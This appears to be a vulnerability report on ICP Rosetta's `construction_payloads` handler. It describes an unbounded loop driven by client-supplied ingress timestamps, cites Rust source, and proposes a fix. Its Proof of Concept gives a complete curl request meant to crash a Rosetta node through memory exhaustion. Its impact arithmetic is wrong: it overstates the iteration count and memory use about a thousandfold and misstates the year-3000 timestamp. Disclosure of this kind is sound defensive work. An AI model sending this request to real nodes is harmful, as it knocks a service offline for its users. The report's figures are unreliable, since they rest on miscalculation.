### Title
Unbounded `ingress_expiries` Loop in ICP Rosetta `construction_payloads` Causes OOM Process Crash — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` values from the request metadata with no bounds validation. It then enters an unbounded `while now < ingress_end` loop, pushing one `u64` per ~2-minute interval into a `Vec`. An unprivileged client can supply `ingress_start=0` and `ingress_end=u64::MAX` (or any far-future timestamp) to force the Rosetta process to allocate hundreds of gigabytes of memory, causing OOM and process termination via a single HTTP POST.

---

### Finding Description

In `construction_payloads`, the `interval` is computed as:

```
MAX_INGRESS_TTL - PERMITTED_DRIFT - 120s ≈ 120 seconds
``` [1](#0-0) 

`ingress_start` and `ingress_end` are taken directly from the caller-supplied metadata with no range or window-size validation: [2](#0-1) 

The loop then runs without any bound: [3](#0-2) 

**Iteration count with `ingress_start=0`, `ingress_end=u64::MAX`:**

```
u64::MAX / (120 × 10⁹ ns) ≈ 153,722,867,280 iterations
Memory = 153 billion × 8 bytes ≈ 1.2 TB
```

Even a modest `ingress_end` of year 3000 (~1.57 × 10¹⁹ ns) yields ~130 billion iterations and ~1 TB of allocation.

**Contrast with the ICRC1 handler**, which has explicit pre-loop guards rejecting invalid windows before the loop executes: [4](#0-3) 

The ICP handler has **no equivalent guard**. The `ConstructionPayloadsRequestMetadata::try_from` path is a pure JSON deserialization with no semantic validation: [5](#0-4) 

---

### Impact Explanation

A single unauthenticated HTTP POST to `/construction/payloads` on the ICP Rosetta node causes the process to allocate gigabytes (or terabytes) of memory for `ingress_expiries`, triggering OOM and process termination. This takes the Rosetta API offline for all users until the process is manually restarted. The IC consensus layer is unaffected, but the Rosetta service — the primary programmatic interface for exchanges and custodians integrating ICP — becomes unavailable.

---

### Likelihood Explanation

The endpoint requires no authentication. The payload is a standard JSON POST. The attack is a single request, requires no prior knowledge beyond the API spec, and is trivially reproducible. There is no rate limiting or request-size guard visible in the handler.

---

### Recommendation

Add a maximum ingress window size check before the loop in the ICP handler, mirroring the ICRC1 pattern. For example:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60); // 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress_end exceeds maximum allowed ingress window of 24 hours",
    ));
}
```

Additionally, add the `ingress_start >= ingress_end` sanity check that the ICRC1 handler already has. [6](#0-5) 

---

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"<valid_account>"},"amount":{"value":"-100000000","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"<valid_pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

Expected: Rosetta process RSS grows unboundedly and is killed by the OOM killer. Compute expected iterations: `18446744073709551615 / 120000000000 ≈ 153,722,867,280`. Each iteration allocates 8 bytes → ~1.2 TB total allocation before termination.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icp/src/models.rs (L240-248)
```rust
impl TryFrom<ObjectMap> for ConstructionPayloadsRequestMetadata {
    type Error = ApiError;
    fn try_from(o: ObjectMap) -> Result<Self, ApiError> {
        serde_json::from_value(serde_json::Value::Object(o)).map_err(|e| {
            ApiError::internal_error(format!(
                "Could not parse ConstructionPayloadsRequestMetadata from Object: {e}"
            ))
        })
    }
```
